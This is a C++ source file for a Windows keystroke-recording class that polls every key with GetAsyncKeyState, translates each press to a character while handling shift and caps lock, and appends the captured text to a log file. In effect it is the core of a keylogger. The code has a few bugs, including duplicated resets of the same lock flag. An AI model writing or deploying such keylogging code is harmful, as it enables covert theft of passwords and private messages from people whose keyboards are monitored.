#include "stdafx.h"
#include "Keyboard.h"

#include <string>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <windows.h>


Keyboard::Keyboard()
	: IRecorder()
{
	lockOn[0] = false;
	lockOn[1] = false;
	capital = false;
}

Keyboard::~Keyboard()
{

}

void				Keyboard::getMajState(unsigned char * keyState) const
{
	if (lockOn[0] == true || capital == true)
		keyState[VK_CAPITAL] = 1;
}

void				Keyboard::shiftLock()
{
	lockOn[0] = true;
}

void				Keyboard::capitalLock()
{
	if (capital == true)
		capital = false;
	else
		capital = true;
}

void			Keyboard::allUnlock()
{
	lockOn[0] = false;
	lockOn[0] = false;
}

void			Keyboard::checkCapital(unsigned int ascii)
{
	if (ascii == VK_SHIFT || ascii == VK_LSHIFT || ascii == VK_RSHIFT)
		this->shiftLock();
	else
	{
		if (lockOn[0] == true)
		{
			if (lockOn[1] == false)
				lockOn[1] = true;
			else
			{
				lockOn[0] = false;
				lockOn[0] = false;
			}
		}
	}
}

const std::string 		Keyboard::manageKeys(unsigned int ascii)
{
	BYTE				keyState[256] = { 0 };
	HKL					keyLayout;
	std::string			key;
	unsigned int		scancode;
	char				buffer[256];

	keyLayout = GetKeyboardLayout(0);
	if (ascii == VK_SHIFT || ascii == VK_LSHIFT || ascii == VK_RSHIFT)
		this->shiftLock();
	else if (ascii == VK_CAPITAL)
		this->capitalLock();
	else
	{
		scancode = MapVirtualKey(ascii, MAPVK_VK_TO_VSC);
		GetKeyboardState(keyState);
		this->getMajState(keyState);
		if (ToAsciiEx(ascii, scancode, keyState, (LPWORD)buffer, 0, keyLayout) != 0)
		{
			key = buffer;
			key = key.at(0);
		}
	}
	return (key);
}

const std::string 		Keyboard::readKey()
{
	std::string			key;
	bool				keyDown = false;
	SHORT				res;

	for (int ascii = 8; ascii <= 254; ascii++)
	{
		if ((res = GetAsyncKeyState(ascii)) < 0)
		{
			keyDown = true;
			if (res == -32767)
				key = this->manageKeys(ascii);
			else
				this->checkCapital(ascii);
		}
	}
	if (!keyDown == false)
		this->allUnlock();
	return (key);
}

void				Keyboard::read()
{
	std::string		key;

	key = this->readKey();
	if (!key.empty())
	{
		record += key;
	}
}

void				Keyboard::write(const std::string & filename)
{
	std::fstream	fs;

	fs.open(filename, std::fstream::out | std::fstream::app);
	fs << record;
	fs.close();
	record.clear();
	record = "";
}